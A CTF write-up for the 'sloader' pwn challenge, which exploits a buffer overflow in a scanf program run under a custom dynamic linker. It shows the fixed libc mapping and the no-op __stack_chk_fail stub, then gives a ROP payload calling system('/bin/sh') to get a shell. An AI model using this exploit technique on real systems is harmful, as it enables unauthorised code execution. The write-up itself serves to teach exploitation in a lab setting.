## sloader (pwn, easy, 39 solves)

[solve.py](solver/solve.py)

### Problem Setting

You are given a binary, which you might think is unsolvable.

```
$ cat chall.c
#include <stdio.h>

int main(void) {
    char buf[16];
    scanf("%s", buf);
    return 0;
}
$ checksec --file=chall
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

However, the server executes the binary by using [`sloader`](https://github.com/akawashiro/sloader) as a dynamic linker (not ld)!

### Solution

If you execute the binary with sloader, you might notice that even though the binary says it's PIE, the address of the binary loaded is always the same, which often happens in some non-standard environments.

```
gef> vmmap
[ Legend:  Code | Heap | Stack | Writable | NONE | RWX ]
Start              End                Size               Offset             Perm Path
0x0000000001400000 0x0000000001401000 0x0000000000001000 0x0000000000000000 rw- /dev/zero (deleted)
0x0000000001401000 0x0000000001402000 0x0000000000001000 0x0000000000000000 rwx /dev/zero (deleted)
0x0000000001402000 0x0000000001403000 0x0000000000001000 0x0000000000000000 rw- /dev/zero (deleted)
0x0000000001403000 0x0000000001405000 0x0000000000002000 0x0000000000000000 rw- /dev/zero (deleted)
0x0000000010000000 0x0000000010001000 0x0000000000001000 0x0000000000000000 r-- /home/ubuntu/tsgctf4/pwn/sloader/src/sloader
0x0000000010001000 0x0000000010263000 0x0000000000262000 0x0000000000001000 r-x /home/ubuntu/tsgctf4/pwn/sloader/src/sloader  <-  $rcx, $rip
0x0000000010263000 0x00000000102e4000 0x0000000000081000 0x0000000000263000 r-- /home/ubuntu/tsgctf4/pwn/sloader/src/sloader
0x00000000102e4000 0x00000000102f1000 0x000000000000d000 0x00000000002e3000 r-- /home/ubuntu/tsgctf4/pwn/sloader/src/sloader
0x00000000102f1000 0x00000000102f4000 0x0000000000003000 0x00000000002f0000 rw- /home/ubuntu/tsgctf4/pwn/sloader/src/sloader  <-  $rbx, $rbp, $r12, $r15
0x00000000102f4000 0x000000001030f000 0x000000000001b000 0x0000000000000000 rw-
0x000000001107f000 0x00000000110d0000 0x0000000000051000 0x0000000000000000 rw- <tls>  <-  $rsi, $r9
0x00007fdccfd75000 0x00007fdccfd79000 0x0000000000004000 0x0000000000000000 rwx /home/ubuntu/tsgctf4/pwn/sloader/src/chall
0x00007fdccfd79000 0x00007fdccfd7d000 0x0000000000004000 0x0000000000000000 rwx /home/ubuntu/tsgctf4/pwn/sloader/src/chall
0x00007ffcf992e000 0x00007ffcf994f000 0x0000000000021000 0x0000000000000000 rw- [stack]  <-  $rsp
0x00007ffcf99d6000 0x00007ffcf99da000 0x0000000000004000 0x0000000000000000 r-- [vvar]
0x00007ffcf99da000 0x00007ffcf99dc000 0x0000000000002000 0x0000000000000000 r-x [vdso]
0xffffffffff600000 0xffffffffff601000 0x0000000000001000 0x0000000000000000 --x [vsyscall]
```

Another interesting point for this linker is how the libc address is resolved.
Let's see what happens how `scanf` in `main` is resolved.
In the middle of scanf, the backtrace is like this

```
gef> bt
#0  0x00000000101f05c2 in read ()
#1  0x0000000010148121 in _IO_new_file_underflow ()
#2  0x000000001014b7a7 in _IO_default_uflow ()
#3  0x00000000101317c0 in __vfscanf_internal ()
#4  0x0000000010130d5f in __isoc99_scanf ()
```
so, `scanf` is located at the strange address `0x0000000010130d5f`. What is this? This is located in the mapped region with a fixed address.
In fact, all the functions in glibc seem to be mapped in the sloader's region.

https://github.com/akawashiro/sloader/blob/0744fde8deab2c3269c11e1075d13c5cc80a82e5/libc_mapping.cc#L281

```
0x0000000010001000 0x0000000010263000 0x0000000000262000 0x0000000000001000 r-x /home/ubuntu/tsgctf4/pwn/sloader/src/sloader  <-  $rcx, $rip
```

This means we don't have to leak any address to bypass ALSR.

Now the problem is how do I bypass the stack canary? If you try to input a large buffer (like "A" * 100) to it, you will notice that you can overwrite the return address!

```
0x7ffc3d465a08|+0x0000|000: 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'[...]  <-  retaddr[1]  <-  $rsp
```
So now we can pwn this chall just by a simple ROP payload:
```
system_addr = 0x1012c960
binsh = 0x10270563
pop_rdi = 0x10009132
ret = pop_rdi + 1

padding = b"A" * 40

payload = [
    ret,
    pop_rdi,
    binsh,
    system_addr,
]

payload = padding + b''.join(map(p64, payload))

```

Why? You don't have to understand why and just do ROP, but let us see what happens. If you go through the source code of sloader, you may notice there is a mapping between the symbols of libc and actual implementations [here](https://github.com/akawashiro/sloader/blob/master/libc_mapping.cc). And the implementation for `stack_chk_fail` is

```
#define DEFINE_DUMMY_FUN(name) \
    void sloader_##name() {    \
        ;                      \
    }
// #define DEFINE_DUMMY_FUN(name) void sloader_##name(){ RAW_PRINT_STR(#name); }

/** ommitted **/

DEFINE_DUMMY_FUN(__stack_chk_fail)
```

`stack_chk_fail` does nothing other than return, so you can freely overwrite the stack canary!
